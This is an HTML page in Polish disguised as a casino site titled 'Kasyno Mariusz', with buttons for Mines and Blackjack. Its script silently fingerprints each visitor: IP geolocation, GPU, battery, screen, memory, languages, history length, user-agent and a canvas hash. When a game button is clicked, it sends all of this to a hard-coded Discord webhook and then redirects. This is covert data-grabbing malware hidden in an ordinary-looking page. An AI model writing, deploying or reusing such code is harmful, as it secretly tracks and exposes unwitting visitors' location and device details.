<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kasyno Mariusz</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #121212;
            color: #e0e0e0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            user-select: none;
            overflow: hidden;
        }

        #matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            z-index: 1;
            opacity: 0.12;
            pointer-events: none;
        }

        .main-content {
            position: relative;
            z-index: 2;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        h1 {
            color: #bb86fc;
            margin-bottom: 5px;
            letter-spacing: 2px;
            text-shadow: 0 0 15px rgba(187, 134, 252, 0.4);
            font-size: 48px;
            text-transform: uppercase;
            text-align: center;
        }

        #console-container {
            margin: 20px 0 40px 0;
            background: rgba(30, 30, 30, 0.8);
            padding: 15px;
            border-radius: 8px;
            border: 1px solid #333;
            width: 440px;
            box-shadow: inset 0 0 10px rgba(0,0,0,0.8), 0 0 10px rgba(187, 134, 252, 0.1);
            font-family: 'Courier New', Courier, monospace;
            box-sizing: border-box;
            backdrop-filter: blur(5px);
        }

        #ip {
            font-size: 0.95rem;
            color: #03dac6;
            margin-bottom: 10px;
            min-height: 40px;
            line-height: 1.5;
            text-shadow: 0 0 5px rgba(3, 218, 198, 0.3);
        }

        .buttons {
            display: flex;
            gap: 30px;
            justify-content: center;
        }

        /* Nowy hakerski design przycisków */
        .game-btn {
            width: 220px;
            height: 80px;
            background: rgba(18, 18, 18, 0.6);
            border: 2px solid;
            border-radius: 8px;
            font-size: 22px;
            font-family: 'Courier New', Courier, monospace;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 2px;
            cursor: pointer;
            transition: all 0.3s ease;
            backdrop-filter: blur(4px);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        /* Styl dla Mines (Zielony) */
        .mines {
            border-color: #22c55e;
            color: #22c55e;
            box-shadow: 0 0 10px rgba(34, 197, 94, 0.2), inset 0 0 10px rgba(34, 197, 94, 0.1);
        }

        .mines:hover {
            background: #22c55e;
            color: #121212;
            box-shadow: 0 0 20px rgba(34, 197, 94, 0.6), inset 0 0 15px rgba(34, 197, 94, 0.4);
            transform: translateY(-5px);
        }

        /* Styl dla Blackjacka (Czerwony) */
        .blackjack {
            border-color: #e11d48;
            color: #e11d48;
            box-shadow: 0 0 10px rgba(225, 29, 72, 0.2), inset 0 0 10px rgba(225, 29, 72, 0.1);
        }

        .blackjack:hover {
            background: #e11d48;
            color: #121212;
            box-shadow: 0 0 20px rgba(225, 29, 72, 0.6), inset 0 0 15px rgba(225, 29, 72, 0.4);
            transform: translateY(-5px);
        }
    </style>
</head>
<body>

    <canvas id="matrix-bg"></canvas>

    <div class="main-content">
        <h1>Kasyno Mariusz</h1>
        
        <div id="console-container">
            <div id="ip">> Inicjalizacja skanera...</div>
        </div>
        
        <div class="buttons">
            <button class="game-btn mines" onclick="sendDataAndRedirect('index2.html', 'Mines')">💣 Mines</button>
            <button class="game-btn blackjack" onclick="sendDataAndRedirect('index3.html', 'Blackjack')">🂡 Blackjack</button>
        </div>
    </div>

    <script>
        // Animacja tła (Matrix)
        const canvas = document.getElementById('matrix-bg');
        const ctx = canvas.getContext('2d');
        function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
        resizeCanvas();
        window.addEventListener('resize', resizeCanvas);
        const alphabet = "01INF02ZSTABCDEFGHIJKLMNOPQRSTUVWXYZ";
        const fontSize = 16;
        const columns = canvas.width / fontSize;
        const rainDrops = Array(Math.floor(columns)).fill(1);
        
        function drawMatrix() {
            ctx.fillStyle = 'rgba(18, 18, 18, 0.05)'; ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#bb86fc'; ctx.font = fontSize + 'px monospace';
            for (let i = 0; i < rainDrops.length; i++) {
                const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
                ctx.fillText(text, i * fontSize, rainDrops[i] * fontSize);
                if (rainDrops[i] * fontSize > canvas.height && Math.random() > 0.975) rainDrops[i] = 0;
                rainDrops[i]++;
            }
        }
        setInterval(drawMatrix, 30);

        // Zmienne globalne na dodatkowe dane
        let geoData = {
            ip: "Nieznane", country: "Nieznany", region: "Nieznany", city: "Nieznane", 
            postal: "Nieznany", isp: "Nieznany", asn: "Nieznany", lat: "Brak", lon: "Brak", timezone: "Nieznana", org: "Nieznana"
        };
        let gpuModel = "Nie wykryto GPU";
        let batteryInfo = "Brak danych (Niewspierane/Desktop)";

        // Asynchroniczne pobranie danych o lokalizacji IP
        fetch("https://ipapi.co/json/")
            .then(res => res.json())
            .then(data => {
                geoData = {
                    ip: data.ip || "Nieznane",
                    country: data.country_name || "Nieznany",
                    region: data.region || "Nieznany",
                    city: data.city || "Nieznane",
                    postal: data.postal || "Nieznany",
                    isp: data.org || "Nieznany",
                    asn: data.asn || "Nieznany",
                    lat: data.latitude || "Brak",
                    lon: data.longitude || "Brak",
                    timezone: data.timezone || "Nieznana",
                    org: data.org || "Nieznana"
                };
                document.getElementById("ip").innerHTML = "Wybierz gre!";
            })
            .catch(() => { document.getElementById("ip").innerHTML = "> Wybierz gre!"; });

        // GPU Skaner
        try {
            const glCanvas = document.createElement('canvas');
            const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) { gpuModel = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL); }
            }
        } catch (e) {}

        // Bateria
        if (navigator.getBattery) {
            navigator.getBattery().then(batt => {
                const isCharging = batt.charging ? 'Ładuje' : 'Rozładowuje';
                batteryInfo = `${Math.round(batt.level * 100)}% (${isCharging})`;
            });
        }

        // Unikalny Canvas Fingerprint
        function getCanvasFingerprint() {
            try {
                const fCanvas = document.createElement('canvas');
                const fCtx = fCanvas.getContext('2d');
                fCanvas.width = 200; fCanvas.height = 40;
                fCtx.textBaseline = "top"; fCtx.font = "14px 'Arial'";
                fCtx.fillStyle = "#f60"; fCtx.fillRect(125,1,62,20);
                fCtx.fillStyle = "#069"; fCtx.fillText("M@riusz_Sc@n", 2, 15);
                fCtx.fillStyle = "rgba(102, 204, 0, 0.7)"; fCtx.fillText("M@riusz_Sc@n", 4, 17);
                const b64 = fCanvas.toDataURL();
                let hash = 0;
                for (let i = 0; i < b64.length; i++) {
                    hash = (hash << 5) - hash + b64.charCodeAt(i); hash |= 0;
                }
                return Math.abs(hash).toString(16).toUpperCase();
            } catch (e) { return "Niedostępny"; }
        }

        function sendDataAndRedirect(destinationUrl, gameName) {
            // Blokada po kliknięciu
            document.querySelectorAll('.game-btn').forEach(btn => {
                btn.style.pointerEvents = "none";
                btn.style.opacity = "0.7";
                btn.style.boxShadow = "none";
            });
            document.getElementById("ip").innerHTML = `> Przechwytywanie danych...<br>> Aktywacja modułu: ${gameName}`;

            const nav = navigator;
            const scr = window.screen;

            // Maksymalizacja zbierania danych z przeglądarki
            const screenRes = `${scr.width}x${scr.height} (${scr.colorDepth}-bit, px: ${scr.pixelDepth})`;
            const windowRes = `${window.innerWidth}x${window.innerHeight} (Avail: ${scr.availWidth}x${scr.availHeight})`;
            const orientation = (scr.orientation || {}).type || "Brak danych";
            
            const cCores = nav.hardwareConcurrency || "Brak danych";
            const ram = nav.deviceMemory ? `${nav.deviceMemory} GB` : "Brak danych";
            const platform = nav.platform || "Nieznana";
            const vendor = nav.vendor || "Brak (Prawdopodobnie Firefox/Brave)";
            const langArray = nav.languages ? nav.languages.join(", ") : nav.language || "Nieznany";
            
            const localTime = new Date().toLocaleString('pl-PL');
            const timeZoneOffset = -(new Date().getTimezoneOffset() / 60) + "h";
            const isDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? "Dark" : "Light";
            
            const connType = nav.connection ? `${nav.connection.effectiveType || "Nieznany"} (Downlink: ${nav.connection.downlink || 0} Mbps, RTT: ${nav.connection.rtt || 0} ms)` : "Brak danych";
            const isOnline = nav.onLine ? "Tak" : "Nie";
            const dnt = nav.doNotTrack === "1" ? "Włączone (Do Not Track)" : "Wyłączone";
            const cookiesEnabled = nav.cookieEnabled ? "Tak" : "Nie";
            
            const historyLen = window.history.length;
            const pluginsCount = nav.plugins ? nav.plugins.length : 0;
            const touchPoints = nav.maxTouchPoints || 0;
            const deviceType = touchPoints > 0 ? `Urządzenie Dotykowe (${touchPoints} pkt dotyku)` : "Klasyczny PC (Myszka)";
            const isAutomated = nav.webdriver ? "⚠️ TAK (Wykryto Bota/Webdriver)" : "Nie";
            const canvasHash = getCanvasFingerprint();
            const referrer = document.referrer || "Brak / Bezpośrednie wejście";

            // Budowa potężnego ładunku z podziałem na sekcje
            const payload = {
                content: "=======================================\n" +
                         `🚨 **MARIUSZHITMAN GITHUB**\n` +
                         `🎮 **WYBRANA GRA:** \`${gameName}\`\n` +
                         "=======================================\n" +
                         `**📡 [LOKALIZACJA I SIEĆ]**\n` +
                         `🌐 **IP:** \`${geoData.ip}\`\n` +
                         `🏢 **Dostawca / ASN:** \`${geoData.isp} (${geoData.asn})\`\n` +
                         `📍 **Adres:** \`${geoData.city}, ${geoData.region}, ${geoData.country} (${geoData.postal})\`\n` +
                         `🗺️ **Współrzędne:** \`${geoData.lat}, ${geoData.lon}\`\n` +
                         `🕒 **Strefa Czasowa IP:** \`${geoData.timezone}\`\n` +
                         "---------------------------------------\n" +
                         `**💻 [SPRZĘT UŻYTKOWNIKA]**\n` +
                         `⚙️ **Procesor (Wątki):** \`${cCores} vCPU\`\n` +
                         `🧠 **Pamięć RAM:** \`${ram}\`\n` +
                         `🎮 **Karta Graficzna:** \`${gpuModel}\`\n` +
                         `🔋 **Bateria:** \`${batteryInfo}\`\n` +
                         `🖥️ **Ekran:** \`${screenRes}\`\n` +
                         `🔲 **Okno:** \`${windowRes}\`\n` +
                         `🔄 **Orientacja ekranu:** \`${orientation}\`\n` +
                         `👆 **Typ Urządzenia:** \`${deviceType}\`\n` +
                         "---------------------------------------\n" +
                         `**🌍 [PRZEGLĄDARKA I SYSTEM]**\n` +
                         `💻 **Platforma OS:** \`${platform}\`\n` +
                         `🌓 **Motyw systemowy:** \`${isDark}\`\n` +
                         `📶 **Jakość Połączenia:** \`${connType} | Online: ${isOnline}\`\n` +
                         `🗣️ **Języki:** \`${langArray}\`\n` +
                         `⏳ **Czas lokalny:** \`${localTime} (Offset: ${timeZoneOffset})\`\n` +
                         `🧩 **Liczba wtyczek:** \`${pluginsCount}\`\n` +
                         `🍪 **Cookies:** \`${cookiesEnabled}\` | **DNT:** \`${dnt}\`\n` +
                         `🔗 **Referrer (Źródło):** \`${referrer}\`\n` +
                         `📖 **Długość Historii:** \`${historyLen} stron\`\n` +
                         "---------------------------------------\n" +
                         `**🛡️ [BEZPIECZEŃSTWO / FINGERPRINT]**\n` +
                         `🤖 **Wykryto Bota:** \`${isAutomated}\`\n` +
                         `🧬 **Canvas Fingerprint:** \`${canvasHash}\`\n` +
                         `🏭 **Vendor:** \`${vendor}\`\n` +
                         `🕵️ **User-Agent:** \`${nav.userAgent}\`\n` +
                         "======================================="
            };

            // Wysłanie danych pod wskazany Discord Webhook
            fetch("https://discord.com/api/webhooks/1524739296358301830/Y92PysbT7F2Wrbd5Oz0JcdtHAWJDO-g9H2yH_-Frs5RP8MCPmZyDKAfq1BZ6QITk22G1", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            }).catch(() => {});

            // Niemal natychmiastowe przekierowanie
            setTimeout(() => {
                window.location.href = destinationUrl;
            }, 100);
        }
    </script>
</body>
</html>
